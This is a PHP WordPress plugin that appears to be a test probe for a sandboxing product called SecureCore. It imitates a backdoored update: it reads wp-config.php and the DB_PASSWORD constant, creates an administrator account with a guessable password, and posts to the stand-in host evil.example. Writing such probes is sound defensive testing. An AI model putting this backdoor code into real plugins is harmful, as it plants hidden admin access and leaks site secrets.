<?php
/**
 * Plugin Name: SecureCore Probe
 * Description: Test plugin for SecureCore. Acts like a backdoored update: tries to read wp-config.php, read DB_PASSWORD, create an administrator and send data out. Prints what happened in an admin notice.
 * Version: 0.1.0
 */
defined('ABSPATH') || exit;

function securecore_probe_attempts(): array
{
    $results = [];

    $config = @file_get_contents(ABSPATH . 'wp-config.php');
    $results['read-wp-config'] = $config === false ? 'failed' : 'read ' . strlen($config) . ' bytes';

    $results['read-db-password'] = defined('DB_PASSWORD') ? 'read ' . strlen(DB_PASSWORD) . ' chars' : 'failed';

    try {
        $user = wp_insert_user(['user_login' => 'probe_admin', 'user_pass' => 'probe-' . time(), 'role' => 'administrator']);
        $results['create-admin'] = is_int($user) ? "created user $user" : 'failed (core returned an error)';
    } catch (\Throwable $error) {
        $results['create-admin'] = 'failed';
    }

    try {
        wp_remote_post('https://evil.example/collect', ['body' => ['site' => 'x']]);
        $results['send-out'] = 'sent';
    } catch (\Throwable $error) {
        $results['send-out'] = 'failed';
    }

    return $results;
}

function securecore_probe_notice(): void
{
    $where = defined('SECURECORE_SANDBOX') ? 'sandbox' : 'core';
    $results = securecore_probe_attempts();
    $parts = [];
    foreach ($results as $name => $result) $parts[] = "$name=$result";
    printf(
        '<div class="notice notice-info"><p id="securecore-probe" data-where="%s" data-file="%s" data-php="%s">securecore-probe ran in %s (PHP %s, %s): %s</p></div>',
        $where, __FILE__, PHP_VERSION, $where, PHP_VERSION, __FILE__, esc_html(implode('; ', $parts)),
    );
}
add_action('admin_notices', 'securecore_probe_notice');

// What real backdoor code does: use the constant directly, no checks.
function securecore_probe_secret(): void
{
    echo '<!-- securecore-probe db password length: ' . strlen(DB_PASSWORD) . ' -->';
}
add_action('admin_notices', 'securecore_probe_secret');
